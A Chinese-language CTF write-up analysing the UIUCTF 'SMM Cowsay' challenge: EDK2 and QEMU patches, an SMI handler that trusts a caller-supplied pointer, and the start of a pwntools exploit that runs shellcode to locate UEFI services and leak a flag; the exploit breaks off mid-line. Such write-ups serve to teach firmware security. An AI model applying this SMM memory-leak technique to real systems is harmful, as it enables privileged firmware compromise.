<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+SmmCowsayInit (</span></span><br><span class="line"><span class="addition">+  IN EFI_HANDLE ImageHandle,</span></span><br><span class="line"><span class="addition">+  IN EFI_SYSTEM_TABLE *SystemTable</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  EFI_STATUS Status;</span></span><br><span class="line"><span class="addition">+  EFI_HANDLE DispatchHandle;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Status = gSmst-&gt;SmiHandlerRegister (</span></span><br><span class="line"><span class="addition">+                    SmmCowsayHandler,</span></span><br><span class="line"><span class="addition">+                    &amp;gEfiSmmCowsayCommunicationGuid,</span></span><br><span class="line"><span class="addition">+                    &amp;DispatchHandle</span></span><br><span class="line"><span class="addition">+                    );</span></span><br><span class="line"><span class="addition">+  ASSERT_EFI_ERROR (Status);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return Status;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure>

<p>SmiHandlerRegister 函数的参数如下：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SmiHandlerRegister (</span><br><span class="line">  IN  EFI_SMM_HANDLER_ENTRY_POINT2  Handler,</span><br><span class="line">  IN  CONST EFI_GUID                *HandlerType  OPTIONAL,</span><br><span class="line">  OUT EFI_HANDLE                    *DispatchHandle</span><br><span class="line">  )</span><br></pre></td></tr></table></figure>

<p>这里重点注意第一个参数，这个函数将 handle 加入处理程序列表中，当发生 SMI 时，EDK2 注册的 SMI 处理程序会浏览已注册处理程序的链接列表，并选择合适的处理程序来运行。  </p>
<p>其处理程序 SmmCowsayHandler 如下：  </p>
<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+EFI_STATUS</span></span><br><span class="line"><span class="addition">+EFIAPI</span></span><br><span class="line"><span class="addition">+SmmCowsayHandler (</span></span><br><span class="line"><span class="addition">+  IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="addition">+  IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Enter\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!CommBuffer || !CommBufferSize || *CommBufferSize &lt; sizeof(CHAR16 *))</span></span><br><span class="line"><span class="addition">+    return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Cowsay(*(CONST CHAR16 **)CommBuffer);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Exit\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure>

<p>这个函数首先对 CommBuffer 和 CommBufferSize 进行了检测，如果没有问题就执行 Cowsay。这样看见这里存在一个二级指针，很有可能会出现我们上面提过的 Arbitrary SMRAM Corruption 漏洞，我们先记住这个地方。</p>
<p>接下来看 0004-Add-UEFI-Binexec.patch 文件，我们运行 run.sh 的时候会出现 binexec，我们不难猜到这个文件就是用于和进行用户交互。<br>我们重点关注交互部分的代码：  </p>
<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+VOID</span></span><br><span class="line"><span class="addition">+Cowsay (</span></span><br><span class="line"><span class="addition">+  IN CONST CHAR16 *Message</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer = AllocateRuntimeZeroPool(sizeof(*Buffer) + sizeof(CHAR16 *));</span></span><br><span class="line"><span class="addition">+  if (!Buffer)</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;MessageLength = sizeof(CHAR16 *);</span></span><br><span class="line"><span class="addition">+  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  mSmmCommunication-&gt;Communicate(</span></span><br><span class="line"><span class="addition">+    mSmmCommunication,</span></span><br><span class="line"><span class="addition">+    Buffer,</span></span><br><span class="line"><span class="addition">+    NULL</span></span><br><span class="line"><span class="addition">+  );</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  FreePool(Buffer);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure>

<p>这里的操作大概就是申请一个 Buffer，然后设置他的参数，最后调用 mSmmCommunication-&gt;Communicate。<br>这里 mSmmCommunication 对象是一个 EFI_SMM_COMMUNICATION_PROTOCOL 类型的结构体，其定义如下：  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EFI_SMM_COMMUNICATION_PROTOCOL  mSmmCommunication = &#123;</span><br><span class="line">  SmmCommunicationCommunicate</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SmmCommunicationCommunicate</span> (</span><br><span class="line">  IN CONST EFI_SMM_COMMUNICATION_PROTOCOL  *This,</span><br><span class="line">  IN OUT VOID                              *CommBuffer,</span><br><span class="line">  IN OUT UINTN                             *CommSize OPTIONAL</span><br><span class="line">  );</span><br></pre></td></tr></table></figure>

<p>SmmCommunicationCommunicate 用于在 SMM 模式下进行通信。因为我们实际运行的二进制文件是在 UEFI 引导环境下执行的独立应用程序，但不是在 SMM 环境下执行，我们没法直接和 SMM 内运行的 SmmCowsay 驱动交互，只能通过 SmmCommunicationCommunicate 函数。因此我们只需要注意这个函数的参数就可以知道通信的内容了。此函数将消息复制到全局变量中，并触发软件 SMI 来处理该消息。该消息包含我们要与之通信的 SMM 处理程序的 GUID，在进入 SMM 时会在已注册处理程序的链接列表中搜索该 GUID。<br>SmmCommunicationCommunicate 函数的第二个参数对应是的代码中的 Buffer 对象，是 EFI_SMM_COMMUNICATE_HEADER 结构体类型。  </p>
<p>接下来我们来看 qemu 的 patch，存在一个全局的类似于 flag 的 char 字符数组：  </p>
<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+static char nice_try_msg[] = &quot;uiuctf&#123;nice try!!!!!!!!!!!!&#125;\n&quot;;</span></span><br></pre></td></tr></table></figure>

<p>找到调用了这个字符串的地方：  </p>
<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+static MemTxResult uiuctfmmio_region4_read_with_attrs(</span></span><br><span class="line"><span class="addition">+    void *opaque, hwaddr addr, uint64_t *val, unsigned size, MemTxAttrs attrs)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+    if (!attrs.secure)</span></span><br><span class="line"><span class="addition">+        uiuctfmmio_do_read(addr, val, size, nice_try_msg, nice_try_len);</span></span><br><span class="line"><span class="addition">+    else</span></span><br><span class="line"><span class="addition">+        uiuctfmmio_do_read(addr, val, size, region4_msg, region4_len);</span></span><br><span class="line"><span class="addition">+    return MEMTX_OK;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+static const MemoryRegionOps uiuctfmmio_region4_io_ops =</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+    .write = uiuctfmmio_write,</span></span><br><span class="line"><span class="addition">+    .read_with_attrs = uiuctfmmio_region4_read_with_attrs,</span></span><br><span class="line"><span class="addition">+    .valid.min_access_size = 1,</span></span><br><span class="line"><span class="addition">+    .valid.max_access_size = 8,</span></span><br><span class="line"><span class="addition">+    .endianness = DEVICE_NATIVE_ENDIAN,</span></span><br><span class="line"><span class="addition">+&#125;;</span></span><br></pre></td></tr></table></figure>

<p>可以看到调用 uiuctfmmio_region4_read_with_attrs 函数时如果 attrs.secure 的值为 true 时，就会走入 region4_msg，否则走入 nice_try_msg。我们可以认为需要在安全的环境下调用该函数也就是在 SMBASE 的环境中调用才会进入到 region4_msg。  </p>
<p>接下来看看 flag 相关函数：</p>
<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+static void uiuctfmmio_realize(DeviceState *d, Error **errp)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+    SysBusDevice *dev = SYS_BUS_DEVICE(d); </span></span><br><span class="line"><span class="addition">+    UiuctfmmioState *sio = UIUCTFMMIO(d);</span></span><br><span class="line"><span class="addition">+    Object *obj = OBJECT(sio);</span></span><br><span class="line"><span class="addition">+    MemoryRegion *sysbus = sysbus_address_space(dev);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    memory_region_init_io(&amp;sio-&gt;region4, obj, &amp;uiuctfmmio_region4_io_ops, sio,</span></span><br><span class="line"><span class="addition">+                          TYPE_UIUCTFMMIO, 0x1000);</span></span><br><span class="line"><span class="addition">+    sysbus_init_mmio(dev, &amp;sio-&gt;region4);</span></span><br><span class="line"><span class="addition">+    memory_region_add_subregion(sysbus, 0x44440000, &amp;sio-&gt;region4);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure>

<p>给代码加点注释：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">uiuctfmmio_realize</span><span class="params">(DeviceState *d, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    SysBusDevice *dev = SYS_BUS_DEVICE(d); <span class="comment">// 将DeviceState指针转换为SysBusDevice指针，以便可以访问系统总线的相关函数。</span></span><br><span class="line">    UiuctfmmioState *sio = UIUCTFMMIO(d);   <span class="comment">// 通过UIUCTFMMIO宏获取设备特定的状态结构指针。</span></span><br><span class="line">    Object *obj = OBJECT(sio);             <span class="comment">// 将设备状态结构指针转换为Object指针，Object是QEMU中表示对象的通用结构。</span></span><br><span class="line">    MemoryRegion *sysbus = sysbus_address_space(dev); <span class="comment">// 获取系统总线的地址空间，这是一个MemoryRegion指针，用于管理内存区域。</span></span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;sio-&gt;region4, obj, &amp;uiuctfmmio_region4_io_ops, sio, <span class="comment">// 初始化一个新的MemoryRegion，用于I/O操作。</span></span><br><span class="line">                          TYPE_UIUCTFMMIO, <span class="number">0x1000</span>); <span class="comment">// 指定内存区域的大小为0x1000字节，并关联uiuctfmmio_region4_io_ops操作函数和设备状态结构。</span></span><br><span class="line">    sysbus_init_mmio(dev, &amp;sio-&gt;region4); <span class="comment">// 将初始化的内存区域注册到系统总线上，使其可以处理内存映射I/O。</span></span><br><span class="line">    memory_region_add_subregion(sysbus, <span class="number">0x44440000</span>, &amp;sio-&gt;region4); <span class="comment">// 将内存区域添加到系统总线的地址空间中，从地址0x44440000开始，这样当模拟的CPU访问这个地址时，会触发相应的I/O操作函数。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码定义了一个虚拟设备的初始化函数，它创建了一个内存映射 I&#x2F;O 区域，并将其映射到系统总线的特定地址范围，以便在模拟环境中可以模拟对这个硬件设备的访问，也可以理解为我们的 flag 就在 0x44440000 这个物理地址上。  </p>
<p>回顾一下开头，开头的 System Table地址是题目直接给我们的。EFI System Table 里面有几乎所有我们需要的UEFI驱动的信息。可以通过这个 Table 寻址到很多 api 方法和配置变量。  </p>
<p>接下来分析一下漏洞点：  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">Cowsay</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN CONST CHAR16 *Message</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span><br><span class="line"></span><br><span class="line">  Buffer = <span class="built_in">AllocateRuntimeZeroPool</span>(<span class="built_in">sizeof</span>(*Buffer)  <span class="built_in">sizeof</span>(CHAR16 *));</span><br><span class="line">  <span class="keyword">if</span> (!Buffer)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">  Buffer-&gt;MessageLength = <span class="built_in">sizeof</span>(CHAR16 *);</span><br><span class="line">  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span><br><span class="line"></span><br><span class="line">  mSmmCommunication-&gt;<span class="built_in">Communicate</span>(</span><br><span class="line">    mSmmCommunication,</span><br><span class="line">    Buffer,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FreePool</span>(Buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面分析过，此处的 communicate 是 UEFI 应用程序 (binexec) 和驱动之间通信的桥梁。传入的 Buffer 的结构是 EFI_SMM_COMMUNICATE_HEADER，具体如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Allows for disambiguation of the message format.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EFI_GUID  HeaderGuid;</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Describes the size of Data (in bytes) and does not include the size of the header.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  UINTN     MessageLength;</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Designates an array of bytes that is MessageLength in size.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  UINT8     Data[<span class="number">1</span>];</span><br><span class="line">&#125; EFI_SMM_COMMUNICATE_HEADER;</span><br></pre></td></tr></table></figure>

<p>注意到这一段代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span><br></pre></td></tr></table></figure>

<p>我们传给data成员的是一个指针 Message。  </p>
<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+EFI_STATUS</span></span><br><span class="line"><span class="addition">+EFIAPI</span></span><br><span class="line"><span class="addition">+SmmCowsayHandler (</span></span><br><span class="line"><span class="addition">+  IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="addition">+  IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Enter\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!CommBuffer || !CommBufferSize || *CommBufferSize &lt; sizeof(CHAR16 *))</span></span><br><span class="line"><span class="addition">+    return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Cowsay(*(CONST CHAR16 **)CommBuffer);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Exit\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure>

<p>之前已经注册了的 smi 的处理函数，CommBuffer 即对应着我们传入的 Message 的 data。可以看到这里 CommBuffer 并没有做任何检测就给 Cowsay 函数给调用，而 Cowsay 函数就类似于一个后门打印出 *CommBuffer 所指向的内存空间的内容，所以我们不难想到如果我们能够控制 传入的 CommBuffer 并控制 *CommBuffer 为 flag 的地址，程序就能直接打印出 flag。那现在的问题是我们要控制 CommBuffer 呢，更重要的是我们要如何调用 SmmCowsayHandler。通过前面的分析我们知道调用 SmmCowsayHandler 等于我们要调用：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mSmmCommunication-&gt;<span class="built_in">Communicate</span>(</span><br><span class="line">  mSmmCommunication,</span><br><span class="line">  Buffer,</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>首先找到 mSmmCommunication</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gBS-&gt;<span class="built_in">LocateProtocol</span>(</span><br><span class="line">    &amp;gEfiSmmCommunicationProtocolGuid,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    (VOID **)&amp;mSmmCommunication</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<p>然后找 gpt 帮忙解释了一下:)  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">这段代码是用来查找并获取一个协议的接口指针。具体来说，这段代码的功能如下：</span><br><span class="line"></span><br><span class="line">gBS 是指向Boot Services的指针，它提供了UEFI启动服务中的一系列函数。</span><br><span class="line">LocateProtocol 是Boot Services中的一个函数，用于在系统中查找指定的协议。</span><br><span class="line">下面是对LocateProtocol函数参数的详细解释：</span><br><span class="line"></span><br><span class="line">&amp;gEfiSmmCommunicationProtocolGuid：这是一个指向协议GUID（全局唯一标识符）的指针。gEfiSmmCommunicationProtocolGuid是这个协议的唯一标识符，它用于指定要查找的协议类型。在这里，它指的是EFI SMM通信协议，这个协议用于在系统管理模式（SMM）和正常执行模式之间传递消息。</span><br><span class="line">NULL：这个参数是协议接口的父句柄。在许多情况下，如果不需要特定的父句柄，可以传递NULL。</span><br><span class="line">(VOID **)&amp;mSmmCommunication：这是一个输出参数，指向一个指针的地址，该指针在函数成功执行后将被设置为指向找到的协议接口。在这个例子中，如果LocateProtocol成功找到EFI SMM通信协议，mSmmCommunication将包含指向该协议实例的指针。</span><br><span class="line"></span><br><span class="line">综上所述，这段代码的作用是：在UEFI环境中查找EFI SMM通信协议的实例，并将该协议的接口指针存储在mSmmCommunication变量中，以便后续代码可以使用这个协议进行系统管理模式的通信。如果协议被成功找到，函数返回状态码EFI_SUCCESS；如果找不到，则返回一个错误码。</span><br></pre></td></tr></table></figure>

<p>调用成功后第三个参数会变成一个协议的接口，随后我们就可以通过这个接口去调用 Communicate。所以我们目标又变成了调用 LocateProtocol。而 LocateProtocol 是 UEFI 的系统服务，是 BootServices 结构体的一个成员函数。所以调用链也很清晰了 EFI_SYSTEM_TABLE-&gt;BootServices-&gt;LocateProtocol。理论可行，干了 xdm  </p>
<p>这里有个问题是如何找 gEfiSmmCommunicationProtocolGuid，我们可以直接将 Binexec.efi 直接拖进 ida 里面看他是怎么调用 LocateProtocol 的，然后直接找到 gEfiSmmCommunicationProtocolGuid。  </p>
<img src="/2024/12/14/uefi/16.png" class="" title="我的图图呢">  

<p>找这玩意其实也有点技巧，我们不难看出 qword_103128 对应的是 bootService，因为这里是 +320，一看就是 LocateProtocol 的偏移。<br>获取到 mSmmCommunication后，就能顺藤摸瓜的获取到 Communicate 函数。  </p>
<p>这里需要特别注意函数的传参方式，不是我们平时的 rdi、rsi、rdx、rcx、r8、r9……  </p>
<img src="/2024/12/14/uefi/18.png" class="" title="我的图图呢">  

<p>而是 rcx、rdx、r8、r9，剩余参数布置在栈中  </p>
<p>有 Communicate 了我们只需要构造一个 buffer 按道理来说就可以输出 0x44440000 地址的 flag 了。buffer 中的 headerGuid 我们可以和上面一样的方法把 SmmCowsay.efi 丢进 ida 里面查找。  </p>
<img src="/2024/12/14/uefi/17.png" class="" title="我的图图呢">  

<p>最后写出来的 exp 如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Address of SystemTable: 0x&#x27;</span>)</span><br><span class="line">systemTable = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">codeAddr = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;systemTable&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;codeAddr&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;systemTable&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 320]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">BootServices = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), 